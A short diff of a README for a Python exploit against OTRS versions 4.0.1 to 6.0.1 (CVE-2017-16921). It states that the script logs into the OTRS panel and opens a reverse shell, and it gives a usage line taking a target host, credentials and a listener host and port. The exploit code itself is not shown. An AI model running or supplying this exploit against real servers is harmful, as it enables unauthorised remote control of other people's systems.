@@ -1,6 +1,7 @@
 # OTRS-4.0.1-6.0.1 Remote Command Execution
 This exploit is developed based on https://www.exploit-db.com/exploits/43853
 It will perform the authentication against OTRS panel and provide a reverse shell.
+
 Usage: python3 CVE-2017-16921.py <RHOST> <email> <password> <LHOST> <LPORT>
 
 CVE-2017-16921:
